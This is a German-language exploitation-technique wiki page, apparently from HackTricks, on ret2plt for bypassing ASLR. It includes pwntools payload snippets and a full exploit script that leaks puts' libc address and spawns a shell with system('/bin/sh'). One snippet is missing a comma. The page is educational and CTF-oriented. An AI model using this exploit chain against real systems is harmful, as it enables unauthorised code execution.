# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Das Ziel dieser Technik wäre, **leak an address from a function from the PLT**, um ASLR umgehen zu können. Dies liegt daran, dass, wenn du zum Beispiel die Adresse der Funktion `puts` aus der libc leakst, du anschließend **berechnen kannst, wo die Basis von `libc` ist** und Offsets berechnen kannst, um auf andere Funktionen wie **`system`** zuzugreifen.

Dies kann mit einem `pwntools` payload such as ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Beachte, wie **`puts`** (unter Verwendung der Adresse aus der PLT) mit der Adresse von `puts` aus der GOT (Global Offset Table) aufgerufen wird. Das liegt daran, dass zum Zeitpunkt, an dem `puts` den GOT-Eintrag von puts ausgibt, dieser **Eintrag die exakte Adresse von `puts` im Speicher** enthalten wird.

Beachte auch, dass die Adresse von `main` im Exploit verwendet wird, sodass, wenn `puts` seine Ausführung beendet, die **binary `main` erneut aufruft statt zu beenden** (damit die leaked address weiterhin gültig bleibt).

> [!CAUTION]
> Beachte, dass damit das funktioniert die **binary nicht mit PIE kompiliert sein darf** oder du musst **einen leak gefunden haben, um PIE zu bypassen**, um die Adresse von PLT, GOT und main zu kennen. Andernfalls musst du zuerst PIE bypassen.

Du findest ein [**vollständiges Beispiel für diesen bypass hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Dies war der finale Exploit aus diesem **Beispiel**:

<details>
<summary>Vollständiges Exploit-Beispiel (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Moderne Überlegungen

- **`-fno-plt` builds** (häufig in modernen Distributionen) ersetzen `call foo@plt` durch `call [foo@got]`. Wenn die Binary keinen `foo@plt`-Stub hat, kannst du die aufgelöste Adresse trotzdem mit `puts(elf.got['foo'])` leaken und dann **direkt zum GOT‑Eintrag zurückkehren** (`flat(padding, elf.got['foo'])`), um in libc zu springen, sobald lazy binding abgeschlossen ist.
- **Full RELRO / `-Wl,-z,now`**: GOT ist schreibgeschützt, aber ret2plt funktioniert trotzdem für leaks, weil du nur das GOT‑Slot liest. Wenn das Symbol nie aufgerufen wurde, führt dein erster ret2plt außerdem lazy binding durch und gibt dann den aufgelösten Slot aus.
- **ASLR + PIE**: Wenn PIE aktiviert ist, leake zuerst einen Code‑Pointer (z. B. gespeicherte return address, function pointer oder einen `.plt`‑Eintrag via einem anderen format‑string/infoleak), um die PIE‑Base zu berechnen, und baue dann die ret2plt‑Kette mit den rebasierten PLT/GOT‑Adressen.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT‑Einträge sind gültige BTI‑Landing‑Pads (`bti c`), daher solltest du beim Exploiten von BTI‑aktivierten Binaries bevorzugt in den PLT‑Stub springen (oder in ein anderes BTI‑annotiertes gadget) anstatt direkt in ein libc‑gadget ohne BTI zu springen, sonst wirft die CPU `BRK`/`PAC`‑Fehler.
- **Quick resolution helper**: Wenn die Ziel‑Funktion noch nicht aufgelöst ist und du in einem einzigen Anlauf einen leak brauchst, kette den PLT‑Aufruf zweimal: zuerst `elf.plt['foo']` (zum Auflösen) und dann nochmal `elf.plt['foo']` mit der GOT‑Adresse als Argument, um den jetzt gefüllten Slot auszugeben.

## Weitere Beispiele & Referenzen

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR aktiviert, aber kein PIE — der erste Schritt ist, einen Overflow so zu füllen, bis zum Byte 0x00 des canary, um dann puts aufzurufen und es zu leaken. Mit dem canary wird ein ROP‑Gadget erstellt, das puts aufruft, um die Adresse von puts aus dem GOT zu leaken, und anschließend ein ROP‑Gadget, um `system('/bin/sh')` aufzurufen.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR aktiviert, kein canary, Stack‑Overflow in main aus einer child function. ROP‑Gadget, das puts aufruft, um die Adresse von puts aus dem GOT zu leaken und anschließend ein one gadget aufruft.

## Referenzen

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
